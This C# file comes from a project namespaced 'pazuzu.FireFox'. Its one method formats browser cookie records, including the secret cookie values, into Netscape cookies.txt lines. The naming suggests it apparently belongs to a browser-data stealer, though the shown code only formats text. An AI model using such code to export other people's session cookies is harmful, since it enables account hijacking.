namespace pazuzu.FireFox;

internal sealed class BrowserUtils
{
	public static string FormatCookie(Common.Cookie cCookie)
	{
		return $"{cCookie.sHostKey}\tTRUE\t{cCookie.sPath}\tFALSE\t{cCookie.sExpiresUtc}\t{cCookie.sName}\t{cCookie.sValue}\r\n";
	}
}
